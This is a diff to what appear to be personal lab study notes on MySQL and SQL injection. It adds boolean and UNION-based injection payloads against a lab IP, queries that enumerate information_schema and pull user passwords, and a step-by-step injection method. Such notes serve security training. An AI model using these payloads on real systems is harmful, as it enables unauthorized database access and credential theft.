@@ -162,6 +162,8 @@ show databases;  (; ends/executes command(s))
 show tables from session; (session = database)
 select * from session.<table>;
 
+
+
 select tireid,name,cost from session.<table>;        
 
 use <database> ( changes current location to that database)
@@ -217,11 +219,30 @@ SQL Injections:
     <weblocation>/login.php?username=Admin&passwd=user' OR '1=1
 
 
+POST
+'Audi 1='1
+GET
+http://10.50.42.112/uniondemo.php?Selection=2 or 1=1
+http://10.50.42.112/uniondemo.php?Selection=4 or 1=1
+
+http://10.50.42.112/uniondemo.php?Selection=2 UNION select 1,2,3#
+                      AYYLMAO   Selection=2 UNION select (1,2,...)table_schema,column_name,table_name(4,5,6...) from information_schema.columns where table_name = ''
+                                  
+custom query                    Selection=2 UNION select name,type,cost from session.car;#
+                                Selection=2 UNION select id,pass,name from session.user;#
 
 
 
-
-
+****SQL by the numbers:
+        Browse website as normal & find input fields + variables
+        test each field, get and/or post ('or 1='1)
+        find total # of columns (Union 1,2,3...)
+        Golden Statement
+            UNION select ..,..,..,.. from information_schema.columns
+        Navigate to Custom Databases
+            What are the 3 default
+        Make query based on custom Tables + columns
+            UNION select ..,..,.. from customtable.customcolumn;#
 
 
 
